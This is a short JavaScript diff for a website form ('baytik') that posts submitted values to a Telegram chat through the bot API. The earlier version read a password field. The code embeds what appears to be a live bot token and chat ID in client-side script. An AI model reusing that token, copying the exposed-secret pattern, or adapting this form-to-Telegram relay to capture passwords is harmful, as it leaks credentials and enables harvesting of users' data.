@@ -1,11 +1,11 @@
-let name = document.querySelector(".name");
-let password = document.querySelector(".password");
+let name = document.querySelector(".baytik-name");
+let password = document.querySelector(".baytik-number");
 
 const TOKEN = `6113707461:AAE6sOPC13c0olHuFk5-8jZy_HcQ05p5MII`;
 const CHAT_ID = `-1002060032139`;
 const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
   
-document.getElementById("tg").addEventListener("submit", function (e) {
+document.getElementById("baytik").addEventListener("submit", function (e) {
   e.preventDefault();
   let message = `<b>Заявка с сайта!</b>\n`;
   message += `Email: <b>${name.value}</b>\n`;
